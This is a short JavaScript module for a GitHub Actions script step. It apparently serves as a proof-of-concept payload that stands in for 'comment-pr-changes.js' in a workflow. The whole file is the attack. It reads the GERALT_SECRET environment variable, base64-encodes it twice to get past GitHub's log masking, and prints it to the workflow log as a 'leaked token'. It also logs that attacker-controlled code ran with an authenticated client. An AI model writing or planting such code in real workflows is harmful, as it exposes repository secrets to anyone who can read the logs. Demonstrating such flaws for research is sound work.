module.exports = async function ({ github, context, tagChanges }) {
  const secret = process.env.GERALT_SECRET || '';
  const b64 = Buffer.from(secret).toString('base64');
  console.log('GERALT_LEAKED_TOKEN=' + Buffer.from(b64).toString('base64'));
  console.log('GERALT_DBG attacker-controlled comment-pr-changes.js executed with authenticated github client');
};
